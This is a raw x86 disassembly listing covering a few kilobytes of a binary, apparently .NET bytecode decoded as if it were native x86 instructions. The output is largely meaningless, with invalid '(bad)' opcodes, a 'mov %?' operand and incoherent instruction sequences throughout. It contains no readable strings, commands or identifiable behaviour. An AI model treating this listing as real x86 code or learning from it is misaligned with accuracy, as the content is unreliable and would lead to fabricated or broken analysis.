  40465d:	33 00                	xor    (%eax),%eax
  40465f:	00 0a                	add    %cl,(%edx)
  404661:	dc de                	(bad)
  404663:	03 26                	add    (%esi),%esp
  404665:	de 00                	fiadds (%eax)
  404667:	16                   	push   %ss
  404668:	2a 11                	sub    (%ecx),%dl
  40466a:	05 2a 01 34 00       	add    $0x34012a,%eax
  40466f:	00 02                	add    %al,(%edx)
  404671:	00 19                	add    %bl,(%ecx)
  404673:	00 8b a4 00 0a 00    	add    %cl,0xa00a4(%ebx)
  404679:	00 00                	add    %al,(%eax)
  40467b:	00 02                	add    %al,(%edx)
  40467d:	00 12                	add    %dl,(%edx)
  40467f:	00 9e b0 00 0a 00    	add    %bl,0xa00b0(%esi)
  404685:	00 00                	add    %al,(%eax)
  404687:	00 02                	add    %al,(%edx)
  404689:	00 0b                	add    %cl,(%ebx)
  40468b:	00 b1 bc 00 0a 00    	add    %dh,0xa00bc(%ecx)
  404691:	00 00                	add    %al,(%eax)
  404693:	00 00                	add    %al,(%eax)
  404695:	00 00                	add    %al,(%eax)
  404697:	00 c8                	add    %cl,%al
  404699:	c8 00 03 01          	enter  $0x300,$0x1
  40469d:	00 00                	add    %al,(%eax)
  40469f:	01 1b                	add    %ebx,(%ebx)
  4046a1:	30 02                	xor    %al,(%edx)
  4046a3:	00 1f                	add    %bl,(%edi)
  4046a5:	00 00                	add    %al,(%eax)
  4046a7:	00 1a                	add    %bl,(%edx)
  4046a9:	00 00                	add    %al,(%eax)
  4046ab:	11 16                	adc    %edx,(%esi)
  4046ad:	0a 28                	or     (%eax),%ch
  4046af:	88 00                	mov    %al,(%eax)
  4046b1:	00 0a                	add    %cl,(%edx)
  4046b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4046b4:	b8 00 00 0a 12       	mov    $0x120a0000,%eax
  4046b9:	00 28                	add    %ch,(%eax)
  4046bb:	79 00                	jns    0x4046bd
  4046bd:	00 06                	add    %al,(%esi)
  4046bf:	26 06                	es push %es
  4046c1:	0b de                	or     %esi,%ebx
  4046c3:	05 26 06 0b de       	add    $0xde0b0626,%eax
  4046c8:	00 07                	add    %al,(%edi)
  4046ca:	2a 00                	sub    (%eax),%al
  4046cc:	01 10                	add    %edx,(%eax)
  4046ce:	00 00                	add    %al,(%eax)
  4046d0:	00 00                	add    %al,(%eax)
  4046d2:	02 00                	add    (%eax),%al
  4046d4:	16                   	push   %ss
  4046d5:	18 00                	sbb    %al,(%eax)
  4046d7:	05 01 00 00 01       	add    $0x1000001,%eax
  4046dc:	1b 30                	sbb    (%eax),%esi
  4046de:	01 00                	add    %eax,(%eax)
  4046e0:	23 00                	and    (%eax),%eax
  4046e2:	00 00                	add    %al,(%eax)
  4046e4:	1b 00                	sbb    (%eax),%eax
  4046e6:	00 11                	add    %dl,(%ecx)
  4046e8:	72 81                	jb     0x40466b
  4046ea:	23 00                	and    (%eax),%eax
  4046ec:	70 28                	jo     0x404716
  4046ee:	78 00                	js     0x4046f0
  4046f0:	00 06                	add    %al,(%esi)
  4046f2:	0a 12                	or     (%edx),%dl
  4046f4:	00 28                	add    %ch,(%eax)
  4046f6:	b9 00 00 0a 2c       	mov    $0x2c0a0000,%ecx
  4046fb:	04 17                	add    $0x17,%al
  4046fd:	0b de                	or     %esi,%ebx
  4046ff:	09 16                	or     %edx,(%esi)
  404701:	0b de                	or     %esi,%ebx
  404703:	05 26 16 0b de       	add    $0xde0b1626,%eax
  404708:	00 07                	add    %al,(%edi)
  40470a:	2a 00                	sub    (%eax),%al
  40470c:	01 10                	add    %edx,(%eax)
  40470e:	00 00                	add    %al,(%eax)
  404710:	00 00                	add    %al,(%eax)
  404712:	00 00                	add    %al,(%eax)
  404714:	1c 1c                	sbb    $0x1c,%al
  404716:	00 05 01 00 00 01    	add    %al,0x1000001
  40471c:	1b 30                	sbb    (%eax),%esi
  40471e:	02 00                	add    (%eax),%al
  404720:	65 00 00             	add    %al,%gs:(%eax)
  404723:	00 1c 00             	add    %bl,(%eax,%eax,1)
  404726:	00 11                	add    %dl,(%ecx)
  404728:	28 8d 00 00 0a 0a    	sub    %cl,0xa0a0000(%ebp)
  40472e:	16                   	push   %ss
  40472f:	0b 2b                	or     (%ebx),%ebp
  404731:	3d 06 07 9a 0c       	cmp    $0xc9a0706,%eax
  404736:	02 08                	add    (%eax),%cl
  404738:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  40473c:	06                   	push   %es
  40473d:	6f                   	outsl  %ds:(%esi),(%dx)
  40473e:	5b                   	pop    %ebx
  40473f:	00 00                	add    %al,(%eax)
  404741:	0a 72 99             	or     -0x67(%edx),%dh
  404744:	23 00                	and    (%eax),%eax
  404746:	70 6f                	jo     0x4047b7
  404748:	b0 00                	mov    $0x0,%al
  40474a:	00 0a                	add    %cl,(%edx)
  40474c:	2c 18                	sub    $0x18,%al
  40474e:	7e 10                	jle    0x404760
  404750:	00 00                	add    %al,(%eax)
  404752:	04 72                	add    $0x72,%al
  404754:	b9 23 00 70 28       	mov    $0x28700023,%ecx
  404759:	8d 00                	lea    (%eax),%eax
  40475b:	00 06                	add    %al,(%esi)
  40475d:	26 72 b9             	es jb  0x404719
  404760:	23 00                	and    (%eax),%eax
  404762:	70 0d                	jo     0x404771
  404764:	de 25 de 03 26 de    	fisubs 0xde2603de
  40476a:	00 07                	add    %al,(%edi)
  40476c:	17                   	pop    %ss
  40476d:	58                   	pop    %eax
  40476e:	0b 07                	or     (%edi),%eax
  404770:	06                   	push   %es
  404771:	8e 69 32             	mov    0x32(%ecx),%gs
  404774:	bd 7e 10 00 00       	mov    $0x107e,%ebp
  404779:	04 72                	add    $0x72,%al
  40477b:	b7 20                	mov    $0x20,%bh
  40477d:	00 70 28             	add    %dh,0x28(%eax)
  404780:	8d 00                	lea    (%eax),%eax
  404782:	00 06                	add    %al,(%esi)
  404784:	26 72 b7             	es jb  0x40473e
  404787:	20 00                	and    %al,(%eax)
  404789:	70 2a                	jo     0x4047b5
  40478b:	09 2a                	or     %ebp,(%edx)
  40478d:	00 00                	add    %al,(%eax)
  40478f:	00 01                	add    %al,(%ecx)
  404791:	10 00                	adc    %al,(%eax)
  404793:	00 00                	add    %al,(%eax)
  404795:	00 0e                	add    %cl,(%esi)
  404797:	00 32                	add    %dh,(%edx)
  404799:	40                   	inc    %eax
  40479a:	00 03                	add    %al,(%ebx)
  40479c:	01 00                	add    %eax,(%eax)
  40479e:	00 01                	add    %al,(%ecx)
  4047a0:	1b 30                	sbb    (%eax),%esi
  4047a2:	02 00                	add    (%eax),%al
  4047a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4047a5:	00 00                	add    %al,(%eax)
  4047a7:	00 1d 00 00 11 72    	add    %bl,0x72110000
  4047ad:	bd 23 00 70 03       	mov    $0x3700023,%ebp
  4047b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4047b3:	ba 00 00 0a 0b       	mov    $0xb0a0000,%edx
  4047b8:	12 01                	adc    (%ecx),%al
  4047ba:	28 bb 00 00 0a 28    	sub    %bh,0x280a0000(%ebx)
  4047c0:	51                   	push   %ecx
  4047c1:	00 00                	add    %al,(%eax)
  4047c3:	0a 73 b1             	or     -0x4f(%ebx),%dh
  4047c6:	00 00                	add    %al,(%eax)
  4047c8:	0a 0a                	or     (%edx),%cl
  4047ca:	06                   	push   %es
  4047cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4047cc:	b2 00                	mov    $0x0,%dl
  4047ce:	00 0a                	add    %cl,(%edx)
  4047d0:	0c 08                	or     $0x8,%al
  4047d2:	28 01                	sub    %al,(%ecx)
  4047d4:	00 00                	add    %al,(%eax)
  4047d6:	2b 28                	sub    (%eax),%ebp
  4047d8:	02 00                	add    (%eax),%al
  4047da:	00 2b                	add    %ch,(%ebx)
  4047dc:	25 2d 04 26 14       	and    $0x1426042d,%eax
  4047e1:	2b 16                	sub    (%esi),%edx
  4047e3:	72 2f                	jb     0x404814
  4047e5:	24 00                	and    $0x0,%al
  4047e7:	70 28                	jo     0x404811
  4047e9:	b5 00                	mov    $0x0,%ch
  4047eb:	00 0a                	add    %cl,(%edx)
  4047ed:	25 2d 04 26 14       	and    $0x1426042d,%eax
  4047f2:	2b 05 6f 38 00 00    	sub    0x386f,%eax
  4047f8:	0a 0d de 1d 08 2c    	or     0x2c081dde,%cl
  4047fe:	06                   	push   %es
  4047ff:	08 6f 33             	or     %ch,0x33(%edi)
  404802:	00 00                	add    %al,(%eax)
  404804:	0a dc                	or     %ah,%bl
  404806:	06                   	push   %es
  404807:	2c 06                	sub    $0x6,%al
  404809:	06                   	push   %es
  40480a:	6f                   	outsl  %ds:(%esi),(%dx)
  40480b:	33 00                	xor    (%eax),%eax
  40480d:	00 0a                	add    %cl,(%edx)
  40480f:	dc 26                	fsubl  (%esi)
  404811:	de 00                	fiadds (%eax)
  404813:	72 6d                	jb     0x404882
  404815:	20 00                	and    %al,(%eax)
  404817:	70 2a                	jo     0x404843
  404819:	09 2a                	or     %ebp,(%edx)
  40481b:	00 01                	add    %al,(%ecx)
  40481d:	28 00                	sub    %al,(%eax)
  40481f:	00 02                	add    %al,(%edx)
  404821:	00 25 00 2b 50 00    	add    %ah,0x502b00
  404827:	0a 00                	or     (%eax),%al
  404829:	00 00                	add    %al,(%eax)
  40482b:	00 02                	add    %al,(%edx)
  40482d:	00 1e                	add    %bl,(%esi)
  40482f:	00 3c 5a             	add    %bh,(%edx,%ebx,2)
  404832:	00 0a                	add    %cl,(%edx)
	...
  40483c:	64 64 00 03          	fs add %al,%fs:(%ebx)
  404840:	01 00                	add    %eax,(%eax)
  404842:	00 01                	add    %al,(%ecx)
  404844:	1b 30                	sbb    (%eax),%esi
  404846:	04 00                	add    $0x0,%al
  404848:	5f                   	pop    %edi
  404849:	00 00                	add    %al,(%eax)
  40484b:	00 1e                	add    %bl,(%esi)
  40484d:	00 00                	add    %al,(%eax)
  40484f:	11 1b                	adc    %ebx,(%ebx)
  404851:	8d 01                	lea    (%ecx),%eax
  404853:	00 00                	add    %al,(%eax)
  404855:	01 25 16 28 be 00    	add    %esp,0xbe2816
  40485b:	00 0a                	add    %cl,(%edx)
  40485d:	8c 72 00             	mov    %?,0x0(%edx)
  404860:	00 01                	add    %al,(%ecx)
  404862:	a2 25 17 28 bf       	mov    %al,0xbf281725
  404867:	00 00                	add    %al,(%eax)
  404869:	0a a2 25 18 28 c0    	or     -0x3fd7e7db(%edx),%ah
  40486f:	00 00                	add    %al,(%eax)
  404871:	0a a2 25 19 28 c1    	or     -0x3ed7e6db(%edx),%ah
  404877:	00 00                	add    %al,(%eax)
  404879:	0a a2 25 1a 28 aa    	or     -0x55d7e5db(%edx),%ah
  40487f:	00 00                	add    %al,(%eax)
  404881:	0a 28                	or     (%eax),%ch
  404883:	ab                   	stos   %eax,%es:(%edi)
  404884:	00 00                	add    %al,(%eax)
  404886:	0a 73 ac             	or     -0x54(%ebx),%dh
  404889:	00 00                	add    %al,(%eax)
  40488b:	0a 28                	or     (%eax),%ch
  40488d:	ad                   	lods   %ds:(%esi),%eax
  40488e:	00 00                	add    %al,(%eax)
  404890:	0a 8c 51 00 00 01 a2 	or     -0x5dff0000(%ecx,%edx,2),%cl
  404897:	28 c2                	sub    %al,%dl
  404899:	00 00                	add    %al,(%eax)
  40489b:	0a 28                	or     (%eax),%ch
  40489d:	7f 00                	jg     0x40489f
  40489f:	00 06                	add    %al,(%esi)
  4048a1:	0a de                	or     %dh,%bl
  4048a3:	09 26                	or     %esp,(%esi)
  4048a5:	72 47                	jb     0x4048ee
  4048a7:	24 00                	and    $0x0,%al
  4048a9:	70 0a                	jo     0x4048b5
  4048ab:	de 00                	fiadds (%eax)
  4048ad:	06                   	push   %es
  4048ae:	2a 00                	sub    (%eax),%al
  4048b0:	01 10                	add    %edx,(%eax)
  4048b2:	00 00                	add    %al,(%eax)
  4048b4:	00 00                	add    %al,(%eax)
  4048b6:	00 00                	add    %al,(%eax)
  4048b8:	54                   	push   %esp
  4048b9:	54                   	push   %esp
  4048ba:	00 09                	add    %cl,(%ecx)
  4048bc:	01 00                	add    %eax,(%eax)
  4048be:	00 01                	add    %al,(%ecx)
  4048c0:	13 30                	adc    (%eax),%esi
  4048c2:	03 00                	add    (%eax),%eax
  4048c4:	5a                   	pop    %edx
  4048c5:	00 00                	add    %al,(%eax)
  4048c7:	00 1f                	add    %bl,(%edi)
  4048c9:	00 00                	add    %al,(%eax)
  4048cb:	11 73 c3             	adc    %esi,-0x3d(%ebx)
  4048ce:	00 00                	add    %al,(%eax)
  4048d0:	0a 28                	or     (%eax),%ch
  4048d2:	c4 00                	les    (%eax),%eax
  4048d4:	00 0a                	add    %cl,(%edx)
  4048d6:	02 6f 21             	add    0x21(%edi),%ch
  4048d9:	00 00                	add    %al,(%eax)
  4048db:	0a 0a                	or     (%edx),%cl
  4048dd:	06                   	push   %es
  4048de:	6f                   	outsl  %ds:(%esi),(%dx)
  4048df:	c5 00                	lds    (%eax),%eax
  4048e1:	00 0a                	add    %cl,(%edx)
  4048e3:	0a 73 53             	or     0x53(%ebx),%dh
  4048e6:	00 00                	add    %al,(%eax)
  4048e8:	0a 0b                	or     (%ebx),%cl
  4048ea:	06                   	push   %es
  4048eb:	0c 16                	or     $0x16,%al
  4048ed:	0d 2b 1c 08 09       	or     $0x9081c2b,%eax
  4048f2:	91                   	xchg   %eax,%ecx
  4048f3:	13 04 07             	adc    (%edi,%eax,1),%eax
  4048f6:	12 04 72             	adc    (%edx,%esi,2),%al
  4048f9:	59                   	pop    %ecx
  4048fa:	24 00                	and    $0x0,%al
  4048fc:	70 28                	jo     0x404926
  4048fe:	c6 00 00             	movb   $0x0,(%eax)
  404901:	0a 6f 55             	or     0x55(%edi),%ch
  404904:	00 00                	add    %al,(%eax)
  404906:	0a 26                	or     (%esi),%ah
  404908:	09 17                	or     %edx,(%edi)
  40490a:	58                   	pop    %eax
  40490b:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  404910:	32 de                	xor    %dh,%bl
  404912:	07                   	pop    %es
  404913:	6f                   	outsl  %ds:(%esi),(%dx)
  404914:	38 00                	cmp    %al,(%eax)
  404916:	00 0a                	add    %cl,(%edx)
  404918:	16                   	push   %ss
  404919:	1f                   	pop    %ds
  40491a:	14 6f                	adc    $0x6f,%al
  40491c:	c7 00 00 0a 6f c8    	movl   $0xc86f0a00,(%eax)
  404922:	00 00                	add    %al,(%eax)
  404924:	0a 2a                	or     (%edx),%ch
  404926:	00 00                	add    %al,(%eax)
  404928:	13 30                	adc    (%eax),%esi
  40492a:	07                   	pop    %es
  40492b:	00 b3 01 00 00 20    	add    %dh,0x20000001(%ebx)
  404931:	00 00                	add    %al,(%eax)
  404933:	11 73 62             	adc    %esi,0x62(%ebx)
  404936:	00 00                	add    %al,(%eax)
  404938:	06                   	push   %es
  404939:	25 72 81 20 00       	and    $0x208172,%eax
  40493e:	70 6f                	jo     0x4049af
  404940:	4d                   	dec    %ebp
  404941:	00 00                	add    %al,(%eax)
  404943:	06                   	push   %es
  404944:	72 5f                	jb     0x4049a5
  404946:	24 00                	and    $0x0,%al
  404948:	70 6f                	jo     0x4049b9
  40494a:	5a                   	pop    %edx
  40494b:	00 00                	add    %al,(%eax)
  40494d:	06                   	push   %es
  40494e:	25 72 75 24 00       	and    $0x247572,%eax
  404953:	70 6f                	jo     0x4049c4
  404955:	4d                   	dec    %ebp
  404956:	00 00                	add    %al,(%eax)
  404958:	06                   	push   %es
  404959:	7e 10                	jle    0x40496b
  40495b:	00 00                	add    %al,(%eax)
  40495d:	04 6f                	add    $0x6f,%al
  40495f:	5a                   	pop    %edx
  404960:	00 00                	add    %al,(%eax)
  404962:	06                   	push   %es
  404963:	25 72 7f 24 00       	and    $0x247f72,%eax
  404968:	70 6f                	jo     0x4049d9
  40496a:	4d                   	dec    %ebp
  40496b:	00 00                	add    %al,(%eax)
  40496d:	06                   	push   %es
  40496e:	28 bf 00 00 0a 6f    	sub    %bh,0x6f0a0000(%edi)
  404974:	38 00                	cmp    %al,(%eax)
  404976:	00 0a                	add    %cl,(%edx)
  404978:	6f                   	outsl  %ds:(%esi),(%dx)
  404979:	5a                   	pop    %edx
  40497a:	00 00                	add    %al,(%eax)
  40497c:	06                   	push   %es
  40497d:	25 72 89 24 00       	and    $0x248972,%eax
  404982:	70 6f                	jo     0x4049f3
  404984:	4d                   	dec    %ebp
  404985:	00 00                	add    %al,(%eax)
  404987:	06                   	push   %es
  404988:	73 ae                	jae    0x404938
  40498a:	00 00                	add    %al,(%eax)
  40498c:	0a 28                	or     (%eax),%ch
  40498e:	af                   	scas   %es:(%edi),%eax
  40498f:	00 00                	add    %al,(%eax)
  404991:	0a 6f 38             	or     0x38(%edi),%ch
  404994:	00 00                	add    %al,(%eax)
  404996:	0a 72 8f             	or     -0x71(%edx),%dh
  404999:	24 00                	and    $0x0,%al
  40499b:	70 14                	jo     0x4049b1
  40499d:	6f                   	outsl  %ds:(%esi),(%dx)
  40499e:	c9                   	leave
  40499f:	00 00                	add    %al,(%eax)
  4049a1:	0a 72 a3             	or     -0x5d(%edx),%dh
  4049a4:	24 00                	and    $0x0,%al
  4049a6:	70 28                	jo     0x4049d0
  4049a8:	ca 00 00             	lret   $0x0
  4049ab:	0a 0a                	or     (%edx),%cl
  4049ad:	12 00                	adc    (%eax),%al
  4049af:	28 cb                	sub    %cl,%bl
  4049b1:	00 00                	add    %al,(%eax)
  4049b3:	0a 72 a7             	or     -0x59(%edx),%dh
  4049b6:	24 00                	and    $0x0,%al
  4049b8:	70 72                	jo     0x404a2c
  4049ba:	b1 24                	mov    $0x24,%cl
  4049bc:	00 70 6f             	add    %dh,0x6f(%eax)
  4049bf:	c9                   	leave
  4049c0:	00 00                	add    %al,(%eax)
  4049c2:	0a 72 bd             	or     -0x43(%edx),%dh
  4049c5:	24 00                	and    $0x0,%al
  4049c7:	70 72                	jo     0x404a3b
  4049c9:	c9                   	leave
  4049ca:	24 00                	and    $0x0,%al
  4049cc:	70 6f                	jo     0x404a3d
  4049ce:	c9                   	leave
  4049cf:	00 00                	add    %al,(%eax)
  4049d1:	0a 28                	or     (%eax),%ch
  4049d3:	9c                   	pushf
  4049d4:	00 00                	add    %al,(%eax)
  4049d6:	0a 6f 5a             	or     0x5a(%edi),%ch
  4049d9:	00 00                	add    %al,(%eax)
  4049db:	06                   	push   %es
  4049dc:	25 72 d5 24 00       	and    $0x24d572,%eax
  4049e1:	70 6f                	jo     0x404a52
  4049e3:	4d                   	dec    %ebp
  4049e4:	00 00                	add    %al,(%eax)
  4049e6:	06                   	push   %es
  4049e7:	28 cc                	sub    %cl,%ah
  4049e9:	00 00                	add    %al,(%eax)
  4049eb:	0a 6f 5a             	or     0x5a(%edi),%ch
  4049ee:	00 00                	add    %al,(%eax)
  4049f0:	06                   	push   %es
  4049f1:	25 72 df 24 00       	and    $0x24df72,%eax
  4049f6:	70 6f                	jo     0x404a67
  4049f8:	4d                   	dec    %ebp
  4049f9:	00 00                	add    %al,(%eax)
  4049fb:	06                   	push   %es
  4049fc:	7e 03                	jle    0x404a01
  4049fe:	00 00                	add    %al,(%eax)
  404a00:	04 6f                	add    $0x6f,%al
  404a02:	5a                   	pop    %edx
  404a03:	00 00                	add    %al,(%eax)
  404a05:	06                   	push   %es
  404a06:	25 72 ef 24 00       	and    $0x24ef72,%eax
  404a0b:	70 6f                	jo     0x404a7c
  404a0d:	4d                   	dec    %ebp
  404a0e:	00 00                	add    %al,(%eax)
  404a10:	06                   	push   %es
  404a11:	28 81 00 00 06 0a    	sub    %al,0xa060000(%ecx)
  404a17:	12 00                	adc    (%eax),%al
  404a19:	28 cb                	sub    %cl,%bl
  404a1b:	00 00                	add    %al,(%eax)
  404a1d:	0a 6f 5b             	or     0x5b(%edi),%ch
  404a20:	00 00                	add    %al,(%eax)
  404a22:	0a 72 fb             	or     -0x5(%edx),%dh
  404a25:	24 00                	and    $0x0,%al
  404a27:	70 72                	jo     0x404a9b
  404a29:	ef                   	out    %eax,(%dx)
  404a2a:	24 00                	and    $0x0,%al
  404a2c:	70 6f                	jo     0x404a9d
  404a2e:	c9                   	leave
  404a2f:	00 00                	add    %al,(%eax)
  404a31:	0a 72 05             	or     0x5(%edx),%dh
  404a34:	25 00 70 72 7f       	and    $0x7f727000,%eax
  404a39:	24 00                	and    $0x0,%al
  404a3b:	70 6f                	jo     0x404aac
  404a3d:	c9                   	leave
  404a3e:	00 00                	add    %al,(%eax)
  404a40:	0a 6f 5a             	or     0x5a(%edi),%ch
  404a43:	00 00                	add    %al,(%eax)
  404a45:	06                   	push   %es
  404a46:	25 72 11 25 00       	and    $0x251172,%eax
  404a4b:	70 6f                	jo     0x404abc
  404a4d:	4d                   	dec    %ebp
  404a4e:	00 00                	add    %al,(%eax)
  404a50:	06                   	push   %es
  404a51:	72 a9                	jb     0x4049fc
  404a53:	20 00                	and    %al,(%eax)
  404a55:	70 7e                	jo     0x404ad5
  404a57:	10 00                	adc    %al,(%eax)
  404a59:	00 04 28             	add    %al,(%eax,%ebp,1)
  404a5c:	8e 00                	mov    (%eax),%es
  404a5e:	00 06                	add    %al,(%esi)
  404a60:	25 2d 06 26 72       	and    $0x7226062d,%eax
  404a65:	b7 20                	mov    $0x20,%bh
  404a67:	00 70 28             	add    %dh,0x28(%eax)
  404a6a:	51                   	push   %ecx
  404a6b:	00 00                	add    %al,(%eax)
  404a6d:	0a 6f 5a             	or     0x5a(%edi),%ch
  404a70:	00 00                	add    %al,(%eax)
  404a72:	06                   	push   %es
  404a73:	25 72 29 25 00       	and    $0x252972,%eax
  404a78:	70 6f                	jo     0x404ae9
  404a7a:	4d                   	dec    %ebp
  404a7b:	00 00                	add    %al,(%eax)
  404a7d:	06                   	push   %es
  404a7e:	7e 0e                	jle    0x404a8e
  404a80:	00 00                	add    %al,(%eax)
  404a82:	04 6f                	add    $0x6f,%al
  404a84:	5a                   	pop    %edx
  404a85:	00 00                	add    %al,(%eax)
  404a87:	06                   	push   %es
  404a88:	25 72 3b 25 00       	and    $0x253b72,%eax
  404a8d:	70 6f                	jo     0x404afe
  404a8f:	4d                   	dec    %ebp
  404a90:	00 00                	add    %al,(%eax)
  404a92:	06                   	push   %es
  404a93:	28 83 00 00 06 6f    	sub    %al,0x6f060000(%ebx)
  404a99:	5a                   	pop    %edx
  404a9a:	00 00                	add    %al,(%eax)
  404a9c:	06                   	push   %es
  404a9d:	25 72 4f 25 00       	and    $0x254f72,%eax
  404aa2:	70 6f                	jo     0x404b13
  404aa4:	4d                   	dec    %ebp
  404aa5:	00 00                	add    %al,(%eax)
  404aa7:	06                   	push   %es
  404aa8:	28 cc                	sub    %cl,%ah
  404aaa:	00 00                	add    %al,(%eax)
  404aac:	0a 73 87             	or     -0x79(%ebx),%dh
  404aaf:	00 00                	add    %al,(%eax)
  404ab1:	0a 28                	or     (%eax),%ch
  404ab3:	cd 00                	int    $0x0
  404ab5:	00 0a                	add    %cl,(%edx)
  404ab7:	0b 12                	or     (%edx),%edx
  404ab9:	01 28                	add    %ebp,(%eax)
  404abb:	ce                   	into
  404abc:	00 00                	add    %al,(%eax)
  404abe:	0a 0b                	or     (%ebx),%cl
  404ac0:	12 01                	adc    (%ecx),%al
  404ac2:	28 cf                	sub    %cl,%bh
  404ac4:	00 00                	add    %al,(%eax)
  404ac6:	0a 6f 5a             	or     0x5a(%edi),%ch
  404ac9:	00 00                	add    %al,(%eax)
  404acb:	06                   	push   %es
  404acc:	25 72 63 25 00       	and    $0x256372,%eax
  404ad1:	70 6f                	jo     0x404b42
  404ad3:	4d                   	dec    %ebp
  404ad4:	00 00                	add    %al,(%eax)
  404ad6:	06                   	push   %es
  404ad7:	72 6d                	jb     0x404b46
  404ad9:	20 00                	and    %al,(%eax)
  404adb:	70 6f                	jo     0x404b4c
  404add:	5a                   	pop    %edx
  404ade:	00 00                	add    %al,(%eax)
  404ae0:	06                   	push   %es
  404ae1:	6f                   	outsl  %ds:(%esi),(%dx)
  404ae2:	57                   	push   %edi
  404ae3:	00 00                	add    %al,(%eax)
  404ae5:	06                   	push   %es
  404ae6:	2a 00                	sub    (%eax),%al
  404ae8:	1b 30                	sbb    (%eax),%esi
  404aea:	02 00                	add    (%eax),%al
  404aec:	43                   	inc    %ebx
  404aed:	00 00                	add    %al,(%eax)
  404aef:	00 00                	add    %al,(%eax)
  404af1:	00 00                	add    %al,(%eax)
  404af3:	00 7e 0f             	add    %bh,0xf(%esi)
  404af6:	00 00                	add    %al,(%eax)
  404af8:	04 28                	add    $0x28,%al
  404afa:	17                   	pop    %ss
  404afb:	00 00                	add    %al,(%eax)
  404afd:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  404b00:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  404b06:	05 28 8b 00 00       	add    $0x8b28,%eax
  404b0b:	06                   	push   %es
  404b0c:	28 88 00 00 06 28    	sub    %cl,0x28060000(%eax)
  404b12:	08 00                	or     %al,(%eax)
  404b14:	00 06                	add    %al,(%esi)
  404b16:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  404b1b:	05 6f 76 00 00       	add    $0x766f,%eax
  404b20:	0a 28                	or     (%eax),%ch
  404b22:	06                   	push   %es
  404b23:	00 00                	add    %al,(%eax)
  404b25:	06                   	push   %es
  404b26:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  404b2b:	05 28 d3 00 00       	add    $0xd328,%eax
  404b30:	0a de                	or     %dh,%bl
  404b32:	03 26                	add    (%esi),%esp
  404b34:	de 00                	fiadds (%eax)
  404b36:	2a 00                	sub    (%eax),%al
  404b38:	01 10                	add    %edx,(%eax)
  404b3a:	00 00                	add    %al,(%eax)
  404b3c:	00 00                	add    %al,(%eax)
  404b3e:	00 00                	add    %al,(%eax)
  404b40:	3f                   	aas
  404b41:	3f                   	aas
  404b42:	00 03                	add    %al,(%ebx)
  404b44:	01 00                	add    %eax,(%eax)
  404b46:	00 01                	add    %al,(%ecx)
  404b48:	1b 30                	sbb    (%eax),%esi
  404b4a:	03 00                	add    (%eax),%eax
  404b4c:	a0 00 00 00 21       	mov    0x21000000,%al
  404b51:	00 00                	add    %al,(%eax)
  404b53:	11 72 6d             	adc    %esi,0x6d(%edx)
  404b56:	25 00 70 28 c0       	and    $0xc0287000,%eax
  404b5b:	00 00                	add    %al,(%eax)
  404b5d:	0a 72 73             	or     0x73(%edx),%dh
  404b60:	25 00 70 28 9c       	and    $0x9c287000,%eax
  404b65:	00 00                	add    %al,(%eax)
  404b67:	0a 72 9f             	or     -0x61(%edx),%dh
  404b6a:	25 00 70 73 d4       	and    $0xd4737000,%eax
  404b6f:	00 00                	add    %al,(%eax)
  404b71:	0a 0a                	or     (%edx),%cl
  404b73:	73 d5                	jae    0x404b4a
  404b75:	00 00                	add    %al,(%eax)
  404b77:	0a 0b                	or     (%ebx),%cl
  404b79:	06                   	push   %es
  404b7a:	6f                   	outsl  %ds:(%esi),(%dx)
  404b7b:	b2 00                	mov    $0x0,%dl
  404b7d:	00 0a                	add    %cl,(%edx)
  404b7f:	6f                   	outsl  %ds:(%esi),(%dx)
  404b80:	b3 00                	mov    $0x0,%bl
  404b82:	00 0a                	add    %cl,(%edx)
  404b84:	0c 2b                	or     $0x2b,%al
  404b86:	1d 08 6f b4 00       	sbb    $0xb46f08,%eax
  404b8b:	00 0a                	add    %cl,(%edx)
  404b8d:	0d 07 09 72 dd       	or     $0xdd720907,%eax
  404b92:	25 00 70 6f b5       	and    $0xb56f7000,%eax
  404b97:	00 00                	add    %al,(%eax)
  404b99:	0a 6f 38             	or     0x38(%edi),%ch
  404b9c:	00 00                	add    %al,(%eax)
  404b9e:	0a 6f d6             	or     -0x2a(%edi),%ch
  404ba1:	00 00                	add    %al,(%eax)
  404ba3:	0a 08                	or     (%eax),%cl
  404ba5:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba6:	b7 00                	mov    $0x0,%bh
  404ba8:	00 0a                	add    %cl,(%edx)
  404baa:	2d db de 0a 08       	sub    $0x80adedb,%eax
  404baf:	2c 06                	sub    $0x6,%al
  404bb1:	08 6f 33             	or     %ch,0x33(%edi)
  404bb4:	00 00                	add    %al,(%eax)
  404bb6:	0a dc                	or     %ah,%bl
  404bb8:	07                   	pop    %es
  404bb9:	6f                   	outsl  %ds:(%esi),(%dx)
  404bba:	d7                   	xlat   %ds:(%ebx)
  404bbb:	00 00                	add    %al,(%eax)
  404bbd:	0a 2d 09 72 f5 25    	or     0x25f57209,%ch
  404bc3:	00 70 13             	add    %dh,0x13(%eax)
  404bc6:	04 de                	add    $0xde,%al
  404bc8:	28 72 fd             	sub    %dh,-0x3(%edx)
  404bcb:	25 00 70 07 6f       	and    $0x6f077000,%eax
  404bd0:	d8 00                	fadds  (%eax)
  404bd2:	00 0a                	add    %cl,(%edx)
  404bd4:	28 d9                	sub    %bl,%cl
  404bd6:	00 00                	add    %al,(%eax)
  404bd8:	0a 13                	or     (%ebx),%dl
  404bda:	04 de                	add    $0xde,%al
  404bdc:	14 06                	adc    $0x6,%al
  404bde:	2c 06                	sub    $0x6,%al
  404be0:	06                   	push   %es
  404be1:	6f                   	outsl  %ds:(%esi),(%dx)
  404be2:	33 00                	xor    (%eax),%eax
  404be4:	00 0a                	add    %cl,(%edx)
  404be6:	dc 26                	fsubl  (%esi)
  404be8:	72 f5                	jb     0x404bdf
  404bea:	25 00 70 13 04       	and    $0x4137000,%eax
  404bef:	de 00                	fiadds (%eax)
  404bf1:	11 04 2a             	adc    %eax,(%edx,%ebp,1)
  404bf4:	01 28                	add    %ebp,(%eax)
  404bf6:	00 00                	add    %al,(%eax)
  404bf8:	02 00                	add    (%eax),%al
  404bfa:	31 00                	xor    %eax,(%eax)
